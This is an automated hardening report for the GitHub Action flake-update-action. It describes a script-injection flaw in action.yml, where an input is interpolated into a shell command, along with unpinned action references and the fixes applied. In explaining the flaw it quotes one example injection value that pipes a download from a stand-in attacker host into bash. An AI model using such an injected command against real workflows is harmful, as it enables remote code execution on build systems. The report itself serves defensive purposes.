<!-- markdownlint-disable -->

# Hardening Report: cpcloud--flake-update-action/v2.0.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **cpcloud--flake-update-action/v2.0.1** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a) violation: The `run:` block directly interpolates the attacker-controlled expression `${{ inputs.dependency }}` into a shell command string. The line `run: nix flake lock --update-input ${{ inputs.dependency }}` passes the input value through YAML template substitution before the shell ever sees it, allowing an attacker who controls the `dependency` input to inject arbitrary shell commands (e.g., a value like `foo; curl attacker.com | bash`). The fix is to pass the value via an `env:` variable and reference it as a quoted shell variable: `env: { DEP: "${{ inputs.dependency }}" }` then `run: nix flake lock --update-input "$DEP"`.

Locations:

- `action.yml:51`

### unpinned-uses (severity: high)

All five `uses:` references in action.yml use mutable version tags instead of pinned 40-character SHA commit digests, making the action vulnerable to supply-chain attacks if any of these upstream actions are compromised or their tags are moved. Failing references:
- `cpcloud/flake-dep-info-action@v2.0.11` (lines 45, 55)
- `cpcloud/compare-commits-action@v5.0.37` (line 59)
- `peter-evans/create-pull-request@v5` (line 68)
- `peter-evans/enable-pull-request-automerge@v3` (line 80)
Each should be replaced with its full 40-character commit SHA, e.g. `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4`.

Locations:

- `action.yml:45`
- `action.yml:55`
- `action.yml:59`
- `action.yml:68`
- `action.yml:80`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.dependency }}" appears directly in run: block of step "Update ${{ inputs.dependency }}"; move to env: map

Locations:

- `action.yml:53`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, unpinned-uses

**Notes:**

Fixed all three findings in action.yml: (1) Moved ${{ inputs.dependency }} from the run: block into an env: variable DEPENDENCY and referenced it as "$DEPENDENCY" in the shell command to prevent script injection. (2) Pinned all four unpinned action references to their full 40-character commit SHAs: cpcloud/flake-dep-info-action@9897b26be9888c610fbcb0ceb4322f535c2152b9 (v2.0.11), cpcloud/compare-commits-action@fad8cf390aedb7d442e9e9a8ed1a980d90f2f7e5 (v5.0.37), peter-evans/create-pull-request@4e1beaa7521e8b457b572c090b25bd3db56bf1c5 (v5), peter-evans/enable-pull-request-automerge@a660677d5469627102a1c1e11409dd063606628d (v3).

